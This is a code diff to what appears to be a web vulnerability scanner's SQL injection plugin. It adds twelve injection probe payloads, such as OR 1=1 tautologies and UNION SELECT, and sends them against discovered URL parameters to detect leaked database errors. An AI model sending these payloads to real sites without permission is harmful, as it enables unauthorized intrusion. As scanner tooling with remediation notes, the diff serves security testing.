@@ -39,6 +39,22 @@ REMEDIATION = ("Use parameterized queries / prepared statements everywhere. "
                "Never build SQL by string concatenation. Apply least-privilege "
                "DB accounts and hide error details in production.")
 
+# 12 payload variations: quotes, comments, unions, boolean, stacked-safe
+SQLI_PAYLOADS = [
+    "'",
+    "''",
+    "' OR '1'='1",
+    "' OR 1=1-- ",
+    "' OR '1'='1' -- ",
+    '" OR "1"="1',
+    "') OR ('1'='1",
+    "' UNION SELECT 1-- ",
+    "1' AND '1'='1",
+    "1 AND 1=1",
+    "' AND SLEEP(0)-- ",
+    "%27",
+]
+
 
 class SqliPlugin(Plugin):
     id = "sqli"
@@ -87,6 +103,11 @@ class SqliPlugin(Plugin):
                 a = f"{p.scheme}://{p.netloc}{a}"
             if "?" in a and domain in urlparse(a).netloc:
                 urls.add(a)
+        # chain: URLs discovered by crawler/forms/jsminer
+        for eu in ctx.consume("endpoints"):
+            if isinstance(eu, str) and "?" in eu and \
+                    domain in urlparse(eu).netloc:
+                urls.add(eu)
 
         tested = 0
         for u in list(urls)[:10]:
@@ -95,27 +116,37 @@ class SqliPlugin(Plugin):
             if not params:
                 continue
             for name, val in params[:3]:
-                tested += 1
-                probe = [(n, (v + "'") if n == name else v) for n, v in params]
-                purl = urlunparse(parts._replace(query=urlencode(probe)))
-                try:
-                    pr = await fetch(ctx.http, ctx.limiter, "GET", purl, timeout=15)
-                    body = pr.text[:200000]
-                except Exception:
-                    continue
-                for pat, db in SQL_ERRORS:
-                    if re.search(pat, body, re.I | re.S):
-                        findings.append(self._f(
-                            "leak", "sqli_error_based",
-                            f"CRITICAL: possible SQL injection in parameter '{name}' "
-                            f"({db} error leaked) at {parts.path or '/'}",
-                            source="sqli probe", source_url=purl,
-                            confidence=85, passive=False,
-                            evidence={"severity": "critical",
-                                      "parameter": name,
-                                      "database": db,
-                                      "remediation": REMEDIATION,
-                                      "scope_note": "Authorized testing only. Do not exploit beyond this detection."}))
+                for payload in SQLI_PAYLOADS:
+                    tested += 1
+                    probe = [(n, (v + payload) if n == name else v)
+                             for n, v in params]
+                    purl = urlunparse(parts._replace(query=urlencode(probe)))
+                    try:
+                        pr = await fetch(ctx.http, ctx.limiter, "GET", purl,
+                                         timeout=15)
+                        body = pr.text[:200000]
+                    except Exception:
+                        continue
+                    hit = False
+                    for pat, db in SQL_ERRORS:
+                        if re.search(pat, body, re.I | re.S):
+                            findings.append(self._f(
+                                "leak", "sqli_error_based",
+                                f"CRITICAL: possible SQL injection in parameter "
+                                f"'{name}' ({db} error leaked) at "
+                                f"{parts.path or '/'}",
+                                source="sqli probe", source_url=purl,
+                                confidence=85, passive=False,
+                                evidence={"severity": "critical",
+                                          "parameter": name,
+                                          "database": db,
+                                          "payload": payload,
+                                          "remediation": REMEDIATION,
+                                          "scope_note": "Authorized testing only. "
+                                                        "Do not exploit beyond this detection."}))
+                            hit = True
+                            break
+                    if hit:
                         break
 
         dur = int((time.monotonic() - t0) * 1000)
